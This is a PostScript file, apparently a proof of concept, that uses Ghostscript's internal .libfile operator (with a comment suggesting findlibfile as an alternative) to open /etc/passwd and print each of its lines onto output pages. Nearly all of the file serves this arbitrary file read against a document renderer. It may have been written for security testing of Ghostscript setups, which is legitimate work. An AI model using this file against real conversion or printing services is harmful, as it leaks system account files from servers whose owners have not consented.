%!PS
/Buf 1024 string def                     % line buffer

/Courier             % name the desired font
8 selectfont        % choose the size in points and establish 
/LM 72 def         %Left Margin
/ypos 800 def     %current y position
/lineheight 10 def     %height of a line
/newline { 
    ypos lineheight sub
    /ypos exch def
    % next page if ypos < 10
    ypos 10 lt
    {
        showpage
        /ypos 800 def
    } if
    LM ypos moveto 

    LM ypos moveto 
} def
LM ypos moveto 
% you can use either ".libfile" or "findlibfile" on the following line. remember to check both
(/etc/passwd) .libfile {
    {
        dup Buf readline
        {
            show
        }{
            show
            showpage
            quit
        } ifelse
        % next line
        newline
    } loop
} if
